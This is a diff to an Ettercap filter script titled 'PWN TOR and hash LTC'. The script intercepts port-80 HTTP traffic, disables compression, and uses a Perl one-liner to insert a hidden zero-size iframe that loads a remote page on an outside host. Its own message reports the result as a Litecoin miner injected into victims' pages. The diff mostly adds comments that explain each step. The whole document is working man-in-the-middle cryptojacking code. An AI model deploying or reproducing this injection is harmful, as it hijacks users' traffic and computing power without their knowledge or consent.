@@ -1,19 +1,21 @@
 ###  PWN TOR and hash LTC ###
 ########## oxagast ##########
 
+# change iframe src= to your /lm host location.
+
 if (ip.proto == TCP) {
-  if (tcp.src == 80 || tcp.dst == 80) {                                         # If traffic is TCP protocol and its not coming to us....
+  if (tcp.src == 80 || tcp.dst == 80) {
     if (search(DATA.data, "gzip,deflate")) {
-      replace("gzip,deflate", "            ");
+      replace("gzip,deflate", "            ");   # kill gzip
     }
     if (search(DATA.data, "Accept-Encoding")) {
-      replace("Accept-Encoding", "Accept-Naddah!!");
+      replace("Accept-Encoding", "Accept-Naddah!!");  # kill encoding
     }
     if (search(DATA.data, "<body")) {
-      execinject("rm tmp/pagedata 2>/dev/null");
-      log(DATA.data, "tmp/pagedata");
-      drop();
-      execinject("perl -e 'while ($a = <>) { $c = $c . $a;$chars1 += length($a);if ($a =~ m/<!--.*-->/){$a =~ s/<!--.*-->//g}if($a =~ m/<body/) {$a =~ s/(<body.*?>)(.*)/\1<iframe width=0 height=0 src=\"http:\/\/192.168.0.2\/lm\"><\/iframe>\2/s}; $b = $b . $a;} $chars2 = length($b); if ($chars1 > $chars2) {$b = $b . " "x($chars1-$chars2);print $b} if ($chars1 < $chars2) {print $c}' tmp/pagedata");
+      execinject("rm tmp/pagedata 2>/dev/null"); # make sure its not there
+      log(DATA.data, "tmp/pagedata"); # log the packet
+      drop();  # drop it so it doesn't go through
+      execinject("perl -e 'while ($a = <>) { $c = $c . $a;$chars1 += length($a);if ($a =~ m/<!--.*-->/){$a =~ s/<!--.*-->//g}if($a =~ m/<body/) {$a =~ s/(<body.*?>)(.*)/\1<iframe width=0 height=0 src=\"http:\/\/wtyw.net\/lm\"><\/iframe>\2/s}; $b = $b . $a;} $chars2 = length($b); if ($chars1 > $chars2) {$b = $b . " "x($chars1-$chars2);print $b} if ($chars1 < $chars2) {print $c}' tmp/pagedata");  # remove the comments to make space, inject our iframe, then insert the right number of spaces to fill the void in packet to get right offset
       msg("[*] Miner Injected.\n");
     }
   }
